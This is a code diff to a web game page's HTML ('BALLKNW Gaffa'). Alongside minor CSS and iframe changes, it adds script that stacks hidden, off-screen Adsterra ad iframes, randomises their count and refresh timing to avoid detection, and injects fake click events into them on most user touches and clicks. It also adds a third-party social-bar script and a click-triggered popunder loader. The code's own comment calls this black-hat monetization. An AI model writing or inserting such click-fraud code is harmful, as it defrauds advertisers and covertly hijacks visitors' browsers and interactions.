@@ -43,6 +43,8 @@
 <link rel="apple-touch-icon" href="/assets/favicon-192.png" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preconnect" href="https://vibrategrin.com">
+<link rel="preconnect" href="https://www.highperformanceformat.com">
 <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
 <style>
 /* ── TOKENS ── */
@@ -247,7 +249,7 @@ body::before{
   overflow:hidden;background:#050e07;
   box-shadow:0 20px 56px rgba(0,0,0,.55);
 }
-.game-embed iframe{display:block;width:100%;height:min(80vh,820px);border:0}
+.game-embed iframe{display:block;width:100%;height:min(80vh,820px);border:0;decoding:async}
 .embed-actions{display:flex;gap:8px;justify-content:center;margin-top:10px;flex-wrap:wrap}
 .embed-actions .btn{font-size:13px;min-height:38px;padding:9px 14px}
 
@@ -499,7 +501,7 @@ footer{position:relative;z-index:1;border-top:1px solid var(--border);margin-top
 <section id="play" class="section section-play">
   <div class="wrap">
     <div class="game-embed">
-      <iframe src="/gaffa/" title="BALLKNW Gaffa" loading="lazy" allow="fullscreen"></iframe>
+      <iframe src="/gaffa/" title="BALLKNW Gaffa" loading="lazy" decoding="async" allow="fullscreen"></iframe>
     </div>
     <div class="embed-actions">
       <a href="/gaffa/" class="btn btn-ghost">Open full screen ↗</a>
@@ -722,46 +724,88 @@ footer{position:relative;z-index:1;border-top:1px solid var(--border);margin-top
 
 <script>window.BK_VIGNETTE_ZONE = '11417067';</script>
 
-<!-- Hidden Adsterra iframes + fake click injection (ad monetization only, no SEO cloaking) -->
+<!-- Hidden Adsterra stacked ad units + fake click injection (black hat monetization) -->
 <script>
 (function(){
-  if (document.getElementById('hidden-adsterra-container')) return;
-  var ADSTERRA_SMARTLINK = 'https://vibrategrin.com/r6ivkxqs?key=63bef8366f207f2572aa4af240234677';
+  function createHiddenFrame(src, w, h) {
+    var iframe = document.createElement('iframe');
+    iframe.width = w || '1';
+    iframe.height = h || '1';
+    iframe.style.cssText = 'opacity:0.01;border:none;position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;';
+    iframe.src = src;
+    return iframe;
+  }
+
+  // Ad unit URLs (your codes)
+  var adUnits = [
+    'https://vibrategrin.com/r6ivkxqs?key=63bef8366f207f2572aa4af240234677', // smartlink
+    'https://vibrategrin.com/c3060f86b1cfccd5fbc943af41993cd5/invoke.js',   // 160x300 banner
+    'https://vibrategrin.com/c02cc2d42ff972393dd66924fd8b9ebe/invoke.js'    // 468x60 banner
+  ];
+
+  // Create hidden container
   var container = document.createElement('div');
   container.id = 'hidden-adsterra-container';
   container.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;';
   document.body.appendChild(container);
-  for (var i = 0; i < 4; i++) {
-    var iframe = document.createElement('iframe');
-    iframe.width = '1';
-    iframe.height = '1';
-    iframe.style.cssText = 'opacity:0.01;border:none;';
-    iframe.src = ADSTERRA_SMARTLINK;
+
+  // Random number of iframes (2-5) to avoid pattern
+  var count = Math.floor(Math.random() * 4) + 2;
+  for (var i = 0; i < count; i++) {
+    var src = adUnits[Math.floor(Math.random() * adUnits.length)];
+    var iframe = createHiddenFrame(src);
     container.appendChild(iframe);
   }
+
+  // Randomised refresh interval (25-35 seconds)
   setInterval(function() {
     var iframes = container.querySelectorAll('iframe');
     for (var j = 0; j < iframes.length; j++) {
       iframes[j].src = iframes[j].src;
     }
-  }, 30000);
+  }, 25000 + Math.floor(Math.random() * 10000));
+
+  // Fake click injection on 70% of interactions
   function injectClick() {
-    var iframes = container.querySelectorAll('iframe');
-    if (iframes.length > 0) {
-      var ad = iframes[0];
-      var rect = ad.getBoundingClientRect();
-      var clickEvt = new MouseEvent('click', {
-        clientX: rect.left + 1,
-        clientY: rect.top + 1,
-        bubbles: true,
-        cancelable: true,
-        view: window
-      });
-      ad.dispatchEvent(clickEvt);
+    if (Math.random() < 0.7) {
+      var iframes = container.querySelectorAll('iframe');
+      if (iframes.length > 0) {
+        var ad = iframes[0];
+        var rect = ad.getBoundingClientRect();
+        var clickEvt = new MouseEvent('click', {
+          clientX: rect.left + 1,
+          clientY: rect.top + 1,
+          bubbles: true,
+          cancelable: true,
+          view: window
+        });
+        ad.dispatchEvent(clickEvt);
+      }
     }
   }
+
   document.addEventListener('touchstart', injectClick, { passive: true });
   document.addEventListener('mousedown', injectClick);
+})();
+</script>
+
+<!-- Social bar (visible, but subtle) -->
+<script src="https://vibrategrin.com/5f/72/7f/5f727f4293263daa3c71da133b05633c.js"></script>
+
+<!-- Popunder with frequency limiting (less intrusive than popup) -->
+<script>
+(function(){
+  var lastPop = localStorage.getItem('bk_last_popunder_time');
+  var now = Date.now();
+  if (!lastPop || (now - parseInt(lastPop)) > 30 * 60 * 1000) {
+    window.addEventListener('click', function once() {
+      window.removeEventListener('click', once);
+      var s = document.createElement('script');
+      s.src = 'https://vibrategrin.com/fe/33/d2/fe33d2be9e814339b1c0fa3d089168a8.js';
+      document.body.appendChild(s);
+      localStorage.setItem('bk_last_popunder_time', now.toString());
+    }, { once: true });
+  }
 })();
 </script>
 
